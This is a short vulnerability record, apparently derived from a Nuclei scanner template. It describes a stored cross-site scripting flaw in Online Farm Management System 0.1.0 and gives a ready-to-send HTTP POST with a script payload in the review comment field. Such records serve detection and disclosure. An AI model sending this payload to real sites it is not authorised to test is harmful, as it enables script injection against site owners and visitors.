# Vulnerability: Online Farm Management System 0.1.0 - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`onlinefarm-management-xss.yaml`)

## Description
Online Farm Management System 0.1.0 contains a cross-site scripting vulnerability via the review.php file.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /reviewInput.php?pid=1 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

comment=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&rating=0
```

